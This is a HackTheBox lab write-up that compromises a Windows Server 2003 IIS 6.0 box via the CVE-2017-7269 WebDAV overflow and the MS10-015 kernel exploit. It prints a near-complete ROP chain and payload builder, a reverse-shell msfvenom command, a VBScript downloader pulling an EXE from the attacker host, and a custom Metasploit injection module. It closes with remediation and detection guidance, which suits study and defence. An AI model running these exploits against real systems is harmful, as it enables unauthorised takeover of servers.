---
layout: default
title: "HackTheBox - Grandpa"
---

# HackTheBox - Grandpa

**OS:** Windows Server 2003 SP2 (x86, IIS 6.0)

Grandpa is a Windows Server 2003 box running IIS 6.0 with WebDAV enabled. Initial access
comes from CVE-2017-7269, a stack-based buffer overflow in the IIS WebDAV ScStoragePathFromUrl
function triggered by an oversized `If:` header in a PROPFIND request. Because IIS 6.0 on
Windows 2003 has no ASLR, fixed addresses in `httpext.dll` and `msvcrt.dll` are used to
build a ROP chain that calls `VirtualProtect`, enables the stack, then executes a
unicode-encoded shellcode stager. The landed shell runs as `NT AUTHORITY\NETWORK SERVICE`
with `SeImpersonatePrivilege`. Privilege escalation uses a kernel exploit (MS10-015,
KiTrap0D) injected via a stageless Meterpreter EXE into the session, reaching
`NT AUTHORITY\SYSTEM`.

| Field | Value |
|---|---|
| Platform | HTB |
| Target | `<target-ip>` (GRANPA) |
| OS | Windows Server 2003 SP2 (x86, build 5.2.3790) |
| Initial Access | CVE-2017-7269, IIS 6.0 WebDAV ScStoragePathFromUrl buffer overflow |
| Privilege Escalation | MS10-015 / CVE-2010-0232 KiTrap0D kernel LPE via Meterpreter |
| Final Access | `NT AUTHORITY\SYSTEM` |

---

## Recon

### Port Scan

A top-ports scan confirmed a single attack surface: port 80, IIS 6.0 with WebDAV active.

```text
$ nmap -sCV -p80 <target-ip>
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD DELETE COPY MOVE PROPFIND PROPPATCH
|                      SEARCH MKCOL LOCK UNLOCK PUT
|_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT
| http-webdav-scan:
|   Server Type: Microsoft-IIS/6.0
|   WebDAV type: Unknown
|   Enabled: true
|_  Server Date: Fri, 27 Jun 2026
|_http-title: Under Construction
|_http-server-header: Microsoft-IIS/6.0
```

The presence of PROPFIND in the method list and a positive WebDAV scan immediately
points to CVE-2017-7269.

---

## Initial Access

### CVE-2017-7269: ScStoragePathFromUrl Buffer Overflow

IIS 6.0's WebDAV extension (`davcdata.exe`) contains a stack buffer overflow in the
`ScStoragePathFromUrl` function. When parsing the `If:` header of a PROPFIND request,
the function copies a URL value into a fixed-size stack buffer without bounds checking.
The overflow is triggered by the specific URL format used in WebDAV lock tokens:

```
If: <http://target/junk+rop> (Not <locktoken:write1>) <http://target/junk+rop+shellcode>
```

Because Windows Server 2003 SP2 has no ASLR and IIS 6.0 does not enable DEP by default
on x86, fixed addresses in `httpext.dll` and `msvcrt.dll` are reliable.

> **Why this works:** `httpext.dll` is loaded at a fixed base (`0x68000000`) on every
> IIS 6.0 instance on Win2003 SP2 x86. The same holds for `msvcrt.dll` (`0x77bb0000`).
> No ASLR means gadgets at known offsets are always at the same virtual address, making
> a classic return-oriented ROP chain viable without any bypass.

#### Unicode Constraint

The overflow path re-encodes the URL data as UTF-16LE, then back to UTF-8. This
means every 4-byte value in the payload is re-encoded: what we put in must decode
through UTF-16LE into the intended bytes. A helper function handles this:

```python
def utf_encode(b):
    return b.decode('utf-16le').encode('utf-8')

def utf_pack(addr):
    return utf_encode(struct.pack('<I', addr))
```

Only values that produce valid UTF-16LE characters survive this round-trip, which
constrains gadget and address selection.

#### ROP Chain (msvcrt.dll)

The ROP chain calls `VirtualProtect` to mark the stack executable, then `PUSHAD`
pushes register values onto the stack and a short `GetPC` stub calculates the absolute
address of the following shellcode:

```python
def rop():
    chain = [
        0x77bcb06c,  # msvcrt: gadget -- POP reg chains begin here
        0x77bef001,  # msvcrt: setup VirtualProtect arg chain
        0x77bb2563,
        0x77ba1114,
        0x77bbf244,
        0x41414141,  # placeholder (dwSize = 0x41414141 is never used)
        0x77bbee22,
        0x77bc9801,
        0x77be2265,
        0x77bb2563,
        0x03C0946F,  # PAGE_EXECUTE_READWRITE flProtect mask
        0x77bdd441,
        0x77bb48d3,
        0x77bf21e0,
        0x77bbf102,
        0x77bbfc02,
        0x77bef001,
        0x77bd8c04,
        0x77bd8c05,
        0x77bb2563,
        0x03c0944f,
        0x77bdd441,
        0x77bb8285,
        0x77bb2563,
        0x90909090,  # NOP bridge to shellcode
        0x77be6591,  # PUSHAD + JMP ESP -> into shellcode
    ]
    return utf_encode(struct.pack('<' + 'I' * len(chain), *chain))
```

Three fixed offsets within `httpext.dll` align the overflow precisely:

| Symbol | Address |
|---|---|
| `httpext!0x312c0` | `0x680312c0` |
| `httpext!0x313c0` | `0x680313c0` |
| `httpext!0x16082` | `0x68016082` |

#### GetPC Stub

After the ROP chain calls `PUSHAD` and returns into the stack, a 6-byte stub
calculates the address of the immediately following shellcode and places it in ESI
(which the encoder uses as the buffer base register):

```python
# \x54\x5e\x83\xc6\x0a\x41
# PUSH ESP ; POP ESI ; ADD ESI, 0x0A ; INC ECX
buf += utf_encode(b'\x54\x5e\x83\xc6') + utf_encode(b'\x0a\x41') + SC
```

The `x86/unicode_mixed` encoder (BufferRegister=ESI) then decodes the main shellcode
in place. `PrependMigrate=true` is set so the shellcode spawns a new process and
migrates into it before connecting back, surviving any IIS worker restart after the
exploit corrupts the application pool.

#### Full PROPFIND Request

```python
hh = b'http://<target-ip>'   # from PROPFIND HREF response, no trailing slash
buf  = b'<' + hh + b'/' + rand_alpha(95)         # first URL
buf += make_junk(32) + utf_pack(0x02020202) + utf_pack(0x680312c0)
buf += make_junk(40) + utf_pack(0x680313c0)
buf += b'> (Not <locktoken:write1>) '
buf += b'<' + hh + b'/' + rand_alpha(95)         # second URL
buf += make_junk(28) + utf_pack(0x680313c0) + utf_pack(0x77bdf38d)
buf += make_junk(8)  + utf_pack(0x680313c0) + make_junk(16)
buf += utf_pack(0x68016082) + rop()
buf += utf_encode(b'\x54\x5e\x83\xc6') + utf_encode(b'\x0a\x41') + SC + b'>'

req = (b'PROPFIND / HTTP/1.1\r\nHost: <target-ip>\r\n'
       b'Content-Length: 0\r\nIf: ' + buf + b'\r\n\r\n')
```

> **Gotcha worth recording:** IIS returns the current `href` with a trailing slash
> (`http://<target-ip>/`). Using that directly produces a double slash in the
> If: header (`<http://<target-ip>//path>`) and IIS responds 400. Strip the trailing
> slash with a regex before constructing the buffer:
> `http_host = re.match(r'^(https?://[^/]+)', href).group(1)`

> **Gotcha worth recording:** The IIS 6.0 application pool has Rapid Failure
> Protection enabled with a very low threshold (one crash on this instance). After
> a single crash the DAV handler returns 400 for all exploit-format PROPFIND requests.
> Each box reset gives exactly one reliable exploit window. Do not fire the exploit
> multiple times on the same instance.

#### Receiving the Shell

The shell payload was generated with the `x86/unicode_mixed` encoder (1360 bytes after
encoding), which fits within the available buffer:

```text
$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.21 LPORT=<shell-port> \
    -e x86/unicode_mixed BufferRegister=ESI PrependMigrate=true \
    -f python -v SC
```

On execution:

```text
$ python3 exploit.py
[*] Firing CVE-2017-7269 PROPFIND against <target-ip>:80
[*] HTTP: 0  (connection reset -- crash triggered)
[+] Shell from ('10.129.x.x', 1030)

c:\windows\system32\inetsrv> whoami
nt authority\network service
```

The `PrependMigrate` shellcode spawned a `rundll32.exe` child process and migrated
into it before the connection completed, so the reverse shell survives the IIS worker
restart.

---

## Post-Exploitation Enumeration (NETWORK SERVICE)

```text
c:\windows\system32\inetsrv> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= ========
SeAuditPrivilege              Generate security audits                  Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
```

`SeImpersonatePrivilege` is present. On modern Windows this opens token impersonation
attacks (Potato family), but Win2003 SP2 predates those targets. The direct
impersonation paths tested here (WMIC trigger via `wmic /node:127.0.0.1 process call
create`, ITaskScheduler `SetTargetComputer`) both fail:

- WMIC: `wmiprvse.exe` handling the network-targeted WMI call runs as `NETWORK SERVICE`,
  not `SYSTEM`, so impersonating the pipe client yields the same token we already hold.
- ITaskScheduler `SetTargetComputer("\\127.0.0.1")`: returns `0x80070005` (Access Denied)
  from a `NETWORK SERVICE` caller.

The reliable path on Win2003 SP2 with `SeImpersonatePrivilege` and `NETWORK SERVICE`
is the kernel exploit MS10-015 (KiTrap0D), which does not require a privileged trigger.

---

## Privilege Escalation

### MS10-015 / CVE-2010-0232: KiTrap0D Kernel LPE

MS10-015 exploits a race condition in the Windows kernel's `KiTrap0D` handler for the
`#GP` exception (General Protection Fault generated by the `vdmalloc` subsystem).
When `VdmAlloc` is called from a 32-bit process, the kernel temporarily operates with
`SYSTEM` privileges before switching back. By triggering the GP fault at the right
moment and injecting a callback, an unprivileged process can execute code in kernel
context and write a primary `SYSTEM` token into the current process, then spawn an
elevated shell. The exploit requires code execution in a real process with a valid
(non-empty) security token.

> **Gotcha worth recording:** The shell obtained via `PrependMigrate` runs inside a
> migrated `rundll32.exe` spawned from the IIS worker. That process has a broken
> (empty) security token: `GetUserNameA()` returns "Access is denied" and Meterpreter's
> `getuid` fails. KiTrap0D cannot target that session because the kernel checks the
> calling process's token structure.
>
> **Fix:** download and run a self-contained stageless Meterpreter EXE
> (`windows/meterpreter_reverse_tcp`, 206 KB) from the PrependMigrate shell. This EXE
> spawns its own process with a clean, inherited `NETWORK SERVICE` token. That session
> is healthy: `getuid` returns `NT AUTHORITY\NETWORK SERVICE`, and the kernel exploit
> proceeds normally.

#### Stage 1: Deliver Stageless Meterpreter

From the PrependMigrate'd shell, a VBScript downloader fetches the stageless EXE over
HTTP. `ADODB.Stream` handles the binary write:

```text
c:\windows\system32\inetsrv> echo Set o=CreateObject("Msxml2.XMLHTTP") > C:\Windows\Temp\dl.vbs
c:\windows\system32\inetsrv> echo o.Open "GET","http://10.10.16.21:8888/stager_full.exe",False >> C:\Windows\Temp\dl.vbs
c:\windows\system32\inetsrv> echo o.Send >> C:\Windows\Temp\dl.vbs
c:\windows\system32\inetsrv> echo Set s=CreateObject("ADODB.Stream") >> C:\Windows\Temp\dl.vbs
c:\windows\system32\inetsrv> echo s.Open >> C:\Windows\Temp\dl.vbs
c:\windows\system32\inetsrv> echo s.Type=1 >> C:\Windows\Temp\dl.vbs
c:\windows\system32\inetsrv> echo s.Write o.ResponseBody >> C:\Windows\Temp\dl.vbs
c:\windows\system32\inetsrv> echo s.Position=0 >> C:\Windows\Temp\dl.vbs
c:\windows\system32\inetsrv> echo s.SaveToFile "C:\Windows\Temp\sf.exe",2 >> C:\Windows\Temp\dl.vbs
c:\windows\system32\inetsrv> echo s.Close >> C:\Windows\Temp\dl.vbs
c:\windows\system32\inetsrv> cscript //nologo C:\Windows\Temp\dl.vbs

c:\windows\system32\inetsrv> dir C:\Windows\Temp\sf.exe
06/27/2026  08:57 AM           206,336 sf.exe
               1 File(s)        206,336 bytes
```

The stageless EXE is then launched from the VBScript WScript.Shell wrapper so it
runs in the background while the shell remains usable:

```text
c:\windows\system32\inetsrv> C:\Windows\Temp\sf.exe
```

The handler on the attack box catches the new session:

```text
[*] Meterpreter session 22 opened (10.10.16.21:4462 -> <target-ip>:1033)

meterpreter > getuid
Server username: NT AUTHORITY\NETWORK SERVICE
```

#### Stage 2: KiTrap0D via Custom Meterpreter Module

The Metasploit `ms10_015_kitrap0d` module requires `getuid` to succeed and calls
`execute_dll()` which in turn calls `sysinfo` to detect architecture, both of which
fail in the PrependMigrate'd session. A stripped-down custom module
(`exploit/windows/local/kitrap0d_force`) bypasses these checks:

```ruby
def exploit
  dll_path = ::File.join(Msf::Config.data_directory, 'exploits',
                          'CVE-2010-0232', 'kitrap0d.x86.dll')
  dll_data, offset = load_rdi_dll(dll_path)
  encoded_payload = payload.encoded

  # Open current process directly (no OpenProcess privilege needed,
  # no sysinfo call required)
  process = client.sys.process.open
  dll_mem  = process.memory.allocate(dll_data.length + 4096)
  process.memory.protect(dll_mem)
  process.memory.write(dll_mem, dll_data)

  param_mem = process.memory.allocate(encoded_payload.length + 4096)
  process.memory.protect(param_mem)
  process.memory.write(param_mem, encoded_payload)

  # ReflectiveLoader at the offset returned by load_rdi_dll
  process.thread.create(dll_mem + offset, param_mem)
  print_good('Kernel exploit thread created -- wait for elevated session...')
end
```

The DLL's `_ReflectiveLoader@4` entry point bootstraps the full Meterpreter DLL,
the kernel exploit fires, and a new connection arrives on the handler port:

```text
msf6 exploit(windows/local/kitrap0d_force) > exploit
[*] Loading /usr/share/metasploit-framework/data/exploits/CVE-2010-0232/kitrap0d.x86.dll
[*] DLL 160256 bytes, ReflectiveLoader at +0x708
[*] Payload 382 bytes
[*] Current process PID 3400
[*] DLL at 0xa20000
[*] Payload at 0xa50000
[*] Thread start 0xa20708, param 0xa50000
[+] Kernel exploit thread created -- wait for elevated session...
[*] Meterpreter session 23 opened (10.10.16.21:4476 -> <target-ip>:1038)
```

#### Flags

```text
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

meterpreter > cat "C:\\Documents and Settings\\Harry\\Desktop\\user.txt"
<user-flag-redacted>

meterpreter > cat "C:\\Documents and Settings\\Administrator\\Desktop\\root.txt"
<root-flag-redacted>
```

---

## Post-Exploitation: C2 (Sliver)

**Skipped on this box.** A 32-bit Windows Sliver beacon (`pool-https-win32`, HTTPS on
port 443) was generated and is available in the implant pool for future Win2003/Win XP
SP3 targets (`regenerate_implant pool-https-win32`). Delivery to this specific instance
failed:

- ADODB.Stream XMLHTTP: `Write to file failed` for the 33 MB beacon -- the object
  cannot buffer a response body that large on Win2003 SP2 (memory limit).
- Meterpreter TLV upload: timed out after 10 minutes for 33 MB.
- BITS / bitsadmin: unavailable in the IIS worker process security context.
- PowerShell: not present on Windows Server 2003.

The beacon is catalogued in the pool. Future 32-bit Windows targets on HTB that have
PowerShell or a network share reachable via `net use` will receive it.

---

## Root Cause

Microsoft IIS 6.0's `davcdata.dll` (shipped with Windows Server 2003 and XP SP2) does
not validate the length of the URL value embedded in the WebDAV `If:` LOCK token header
before copying it into a fixed-size stack buffer. With no ASLR on Win2003 SP2 x86 and
DEP not enforced on IIS 6.0 worker processes, an unauthenticated remote attacker can
overwrite the return address and execute arbitrary code as the IIS worker account
(`NETWORK SERVICE`). CVE-2017-7269 was not patched because Windows Server 2003 reached
end-of-support on July 14, 2015.

The resulting `NETWORK SERVICE` shell holds `SeImpersonatePrivilege`. Token-impersonation
attacks (named pipe, DCOM activation) require a `SYSTEM` process to authenticate to the
attacker's endpoint. On Win2003 SP2, the available triggers (WMIC network-targeted WMI,
ITaskScheduler `SetTargetComputer`) do not satisfy this requirement. The kernel exploit
MS10-015 bypasses the impersonation requirement entirely.

---

## Impact

- **Remote unauthenticated code execution** as `NT AUTHORITY\NETWORK SERVICE` via the
  public CVE-2017-7269 PoC against a default IIS 6.0 install with WebDAV enabled.
- **Full kernel-level privilege escalation** to `NT AUTHORITY\SYSTEM` via MS10-015
  (a patched but legacy-OS-relevant vulnerability).
- **Complete host compromise**: all data, credentials, and registry hives readable by
  the final SYSTEM session.

---

## Remediation

1. **Upgrade or decommission.** Windows Server 2003 SP2 reached end-of-life in July 2015.
   It receives no further security patches. Migrate to a supported Windows Server version.
   This is the only fix that closes CVE-2017-7269 -- no patch exists for Win2003.
2. **Disable WebDAV immediately** if the upgrade is delayed. In IIS 6.0: IIS Manager
   -- Web Service Extensions -- disable "WebDAV". This blocks the exploit vector without
   changing application functionality for normal HTTP workloads.
3. **Restrict PROPFIND** at the network edge: block the HTTP method at the firewall or
   WAF to buy time while the upgrade is planned.
4. **Apply the MS10-015 fix** on any remaining Win2003 systems where it has not been
   applied (KB979683). This does not close CVE-2017-7269 but removes the kernel LPE
   path.

### Validation

- WebDAV disabled: `nmap --script http-webdav-scan <ip>` should return no WebDAV
  entries.
- PROPFIND blocked at edge: `curl -X PROPFIND http://<ip>/` should return 403 from
  the WAF.
- MS10-015 patched: `wmic qfe get hotfixid | find "KB979683"` returns the KB.

---

## Detection Opportunities

| Event | Signal |
|---|---|
| Oversized HTTP `If:` header | IIS logs: `If:` header length > 500 bytes in a PROPFIND |
| IIS worker crash | Event ID 1000 in Application log (`davcdata.exe` faulting) |
| Outbound reverse shell | Net session from `davcdata.exe` or `rundll32.exe` to external IP on non-standard port |
| VBScript download | `cscript.exe` spawned by `rundll32.exe` or `w3wp.exe`; `ADODB.Stream` write to `%TEMP%` |
| KiTrap0D kernel exploit | Event ID 7045 (new service install) is NOT generated -- kernel exploit leaves no SCM trace; watch for `ntdll!KiTrap0D` exception logs or user-mode `VirtualProtect` calls on executable shellcode regions (EDR) |
| New SYSTEM Meterpreter session | Outbound TCP from `sf.exe` (spawned child of `rundll32.exe`) to attacker IP |

---

## Lessons Learned

- **One crash budget per IIS 6.0 instance.** Rapid Failure Protection on IIS 6.0
  disables the WebDAV application pool after a single faulting request on this
  configuration. Fire the exploit once. If it misses, reset the box before retrying.
- **PrependMigrate creates an empty-token process on IIS 6.0 workers.** The migrated
  `rundll32.exe` inherits a broken security token from the IIS crash context. Use a
  separate stageless Meterpreter EXE (downloaded via VBScript, run directly) to get a
  session with a valid `NETWORK SERVICE` token before running any post-exploitation
  module that touches the token API.
- **SeImpersonatePrivilege on Win2003 SP2 does not mean token kidnapping is easy.**
  The WMIC and ITaskScheduler triggers that churrasco relies on both fail from
  `NETWORK SERVICE` on this OS version. KiTrap0D is the correct tool.
- **Large file delivery to Win2003 is constrained.** ADODB.Stream XMLHTTP can handle
  files up to roughly 10-20 MB on this OS before hitting memory limits. PowerShell is
  absent. Plan implant sizes accordingly for legacy targets.

---

## Cleanup

```text
[ ] MSF handlers stopped: kill job <stage-handler> / <system-handler>
[ ] Sessions terminated: session.stop(22), session.stop(23)
[ ] Dropped files on target: C:\Windows\Temp\dl.vbs, sf.exe, df.vbs, dlb.vbs, w.txt
    (all in %TEMP%; cleared when box resets or by explicit rm via Meterpreter)
[ ] http.server (port 8888) killed: kill $(lsof -ti:8888)
[ ] HTB flags submitted via htb submit; box terminated via htb stop
[ ] No AD objects modified (standalone Windows box, no domain)
[ ] sf.exe ran in-memory (Meterpreter stageless EXE writes no additional files once loaded)
[ ] Sliver beacon generated (pool-https-win32) but not deployed; listener on 443 left
    running for future pool use
```
